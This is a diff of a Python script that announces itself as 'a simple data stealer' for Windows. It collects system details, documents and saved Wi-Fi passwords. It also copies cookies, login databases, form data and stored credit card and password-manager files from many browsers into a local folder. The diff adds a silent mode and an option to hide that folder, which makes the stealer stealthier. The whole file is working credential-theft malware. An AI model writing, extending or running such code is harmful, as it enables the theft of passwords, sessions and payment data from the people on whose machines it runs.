@@ -1,19 +1,10 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-import os, fnmatch
-import socket
+import os, fnmatch, socket, getpass, shutil, datetime, ctypes, platform, locale, subprocess, sys
 from time import strftime
-import getpass
-import shutil
 from shutil import copyfile
-import datetime
-import ctypes
-import platform
-import locale
-import subprocess
-
 try:
-	if __name__ == "__main__":
+	if "-h" not in str(sys.argv):
 		os.system("cls")
 		windll = ctypes.windll.kernel32
 		lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
@@ -28,22 +19,6 @@ try:
 		timedate = "{~} " + timedate
 		dirname = user + "_" + time
 		prefix = "{~}"
-		print("""
-	 ___      ___   __     __   ___   _______        __      
-	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
-	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
-	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
-	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
-	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\  \ 
-	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)
-
-		a simple data stealer.		                                                         
-		""")
-		print(timedate, "\n(")
-		print("	" + typeos)
-		print("	hostname: ", hostname)
-		print(" 	username: ", user)
-		print(" 	local ip: ", lip)
 		
 		dio = path + "\\" + dirname
 		os.makedirs(dio)
@@ -72,9 +47,8 @@ try:
 		find("*.docx", "C:\\Users\\{0}\\Documents\\".format(user), "\\Documents\\")
 		res2w = "%.2i" % result
 		resst = int(res1t) + int(res2t)
-		print(" 	{~} found .txt: ", resst)
 		ressw = int(res1w) + int(res2w)
-		print(" 	{~} found .docx: ", ressw)
+
 
 		logfile = open(dio + "\\" + user + "-log" + ".json", "w")
 		logfile.write("""
@@ -96,6 +70,26 @@ try:
 	local ip: {4}
 	""".format(timedate, typeos, hostname, user, lip))
 
+		if "-q" not in str(sys.argv):
+			print("""
+	 ___      ___   __     __   ___   _______        __      
+	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
+	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
+	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
+	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
+	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\  \ 
+	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)
+
+		a simple data stealer.		                                                         
+		""")
+			print(timedate, "\n(")
+			print("	" + typeos)
+			print("	hostname: ", hostname)
+			print(" 	username: ", user)
+			print(" 	local ip: ", lip)
+			print(" 	{~} found .txt: ", resst)
+			print(" 	{~} found .docx: ", ressw)
+
 		def networkpass(one, two):
 			try:
 				cost = 0
@@ -111,9 +105,11 @@ try:
 					except IndexError:
 						logfile.write("		{0}:{1}\n".format(i, ""))
 
-				print(" 	{0} found {1} network/s password/s".format(prefix, cost))
+				if "-q" not in str(sys.argv):
+					print(" 	{0} found {1} network/s password/s".format(prefix, cost))
 			except:
-				print(" 	{0} found {1} network/s password/s".format(prefix, cost))
+				if "-q" not in str(sys.argv):
+					print(" 	{0} found {1} network/s password/s".format(prefix, cost))
 
 		if lang == "en_US":
 			networkpass("All User Profile", "Key Content")
@@ -134,9 +130,11 @@ try:
 					find("History", src, "\\Google Chrome\\")
 					find("Login Data", src, "\\Google Chrome\\")
 					find("Web Data", src, "\\Google Chrome\\")
-					print(" 	{+} Google Chrome")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Google Chrome")
 				except OSError:
-					print(" 	{+} Google Chrome")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Google Chrome")
 				
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable".format(user)):
@@ -150,9 +148,11 @@ try:
 					find("History", src, "\\Opera GX\\")
 					find("Login Data", src, "\\Opera GX\\")
 					find("Web Data", src, "\\Opera GX\\")
-					print(" 	{+} Opera GX")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Opera GX")
 				except OSError:
-					print(" 	{+} Opera GX")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Opera GX")
 
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable".format(user)):
@@ -166,9 +166,11 @@ try:
 					find("History", src, "\\Opera\\")
 					find("Login Data", src, "\\Opera\\")
 					find("Web Data", src, "\\Opera\\")
-					print(" 	{+} Opera")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Opera")
 				except OSError:
-					print(" 	{+} Opera")		
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Opera")		
 
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles".format(user)):
@@ -182,9 +184,11 @@ try:
 					find("key4.db", src, "\\Firefox\\")
 					find("logins.json", src, "\\Firefox\\")
 					find("formhistory.sqlite", src, "\\Firefox\\")
-					print(" 	{+} Firefox")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Firefox")
 				except OSError:
-					print(" 	{+} Firefox")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Firefox")
 
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)):
@@ -201,9 +205,11 @@ try:
 					find("Ya Autofill Data", src, "\\Yandex\\")
 					find("Ya Credit Cards", src, "\\Yandex\\")
 					find("Ya Passman Data", src, "\\Yandex\\")
-					print(" 	{+} Yandex")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Yandex")
 				except OSError:
-					print(" 	{+} Yandex")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Yandex")
 
 
 			if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)):
@@ -217,9 +223,11 @@ try:
 					find("History", src, "\\Vivaldi\\")
 					find("Web Data", src, "\\Vivaldi\\")
 					find("Login Data", src, "\\Vivaldi\\")
-					print(" 	{+} Vivaldi")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Vivaldi")
 				except OSError:
-					print(" 	{+} Vivaldi")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Vivaldi")
 				
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)):
@@ -233,9 +241,11 @@ try:
 					find("History", src, "\\Brave\\")
 					find("Login Data", src, "\\Brave\\")
 					find("Web Data", src, "\\Brave\\")
-					print(" 	{+} Brave")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Brave")
 				except OSError:
-					print(" 	{+} Brave")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Brave")
 				
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)):
@@ -249,9 +259,11 @@ try:
 					find("History", src, "\\Chrome Canary\\")
 					find("Login Data", src, "\\Chrome Canary\\")
 					find("Web Data", src, "\\Chrome Canary\\")
-					print(" 	{+} Chrome Canary")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Chrome Canary")
 				except OSError:
-					print(" 	{+} Chrome Canary")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Chrome Canary")
 
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)):
@@ -265,9 +277,11 @@ try:
 					find("History", src, "\\Chromium\\")
 					find("Login Data", src, "\\Chromium\\")
 					find("Web Data", src, "\\Chromium\\")
-					print(" 	{+} Chromium")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Chromium")
 				except OSError:
-					print(" 	{+} Chromium")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Chromium")
 					
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)):
@@ -281,9 +295,11 @@ try:
 					find("History", src, "\\CocCoc\\")
 					find("Login Data", src, "\\CocCoc\\")
 					find("Web Data", src, "\\CocCoc\\")
-					print(" 	{+} CocCoc")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} CocCoc")
 				except OSError:
-					print(" 	{+} CocCoc")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} CocCoc")
 
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)):
@@ -297,9 +313,11 @@ try:
 					find("History", src, "\\Atom\\")
 					find("Login Data", src, "\\Atom\\")
 					find("Web Data", src, "\\Atom\\")
-					print(" 	{+} Atom")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Atom")
 				except OSError:
-					print(" 	{+} Atom")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Atom")
 
 
 			if os.path.exists("C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)):
@@ -313,16 +331,57 @@ try:
 					find("History", src, "\\Orbitum\\")
 					find("Login Data", src, "\\Orbitum\\")
 					find("Web Data", src, "\\Orbitum\\")
-					print(" 	{+} Orbitum")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Orbitum")
 				except OSError:
-					print(" 	{+} Orbitum")		
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Orbitum")
+
+
+			if os.path.exists("C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)):
+				src = "C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)
+				if os.path.exists(dio + "\\Torch"):
+					shutil.rmtree(dio + "\\Torch")
+				os.makedirs(dio + "\\Torch")
+				try:
+					find("Cookies", src, "\\Torch\\")
+					find("Bookmarks", src, "\\Torch\\")
+					find("History", src, "\\Torch\\")
+					find("Login Data", src, "\\Torch\\")
+					find("Web Data", src, "\\Torch\\")
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Torch")
+				except OSError:
+					if "-q" not in str(sys.argv):
+						print(" 	{+} Torch")
+
+			if "-q" not in str(sys.argv):
+				print(")")
 		browsers()
-		print(")")
 		logfile.write("\n)")
 		logfile.close()
-		os._exit(0)
-		#ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
-		#os.system("cls")
+		if "-xh" in str(sys.argv):
+			ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
+	elif "-h" in str(sys.argv):
+		os.system("cls")
+		print("""
+	 ___      ___   __     __   ___   _______        __      
+	|"  \    /"  | |" \   |/"| /  ") /"      \      /""\     
+	 \   \  //   | ||  |  (: |/   / |:        |    /    \    
+	 /\   \/.    | |:  |  |    __/  |_____/   )   /' /\  \   
+	|: \.        | |.  |  (// _  \   //      /   //  __'  \  
+	|.  \    /:  | /\  |\ |: | \  \ |:  __   \  /   /  \\  \ 
+	|___|\__/|___|(__\_|_)(__|  \__)|__|  \___)(___/    \___)
+
+		a simple data stealer.
+
+Usage: mikra.exe [-h] [-xh] [-q]
+
+Optional arguments:
+ -h		Show help.
+ -q		Nothing will be print.
+ -xh		Set hidden attribute to mikra dir.
+		""")
 except KeyboardInterrupt:
 	os.system("cls")
 	os._exit(0)
